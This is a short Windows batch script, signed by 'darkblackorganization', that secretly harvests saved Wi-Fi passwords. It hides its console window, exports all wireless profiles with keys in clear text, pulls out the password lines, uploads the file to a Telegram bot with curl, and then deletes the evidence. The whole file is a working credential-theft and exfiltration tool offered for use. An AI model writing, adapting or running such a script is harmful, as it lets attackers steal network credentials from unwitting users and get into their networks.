@echo off


REM Set console window size
mode con: cols=15 lines=1

REM Change to the temp directory
cd %temp%

REM Export Wi-Fi profiles
netsh wlan export profile key=clear

REM Search for the Wi-Fi password in the exported XML files and save it to a text file
powershell -Command "Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS.txt"

REM Send the Wi-Fi password to Telegram (make sure to replace the bot token and chat ID)
curl -X POST "https://api.telegram.org/bot<bot token>/sendDocument" -F "chat_id=<chat-id>" -F "document=@Wi-Fi-PASS.txt"

REM Clean up the exported files
del Wi-* /s /f /q

REM Exit the command prompt
exit


REM author- darkblackorganization
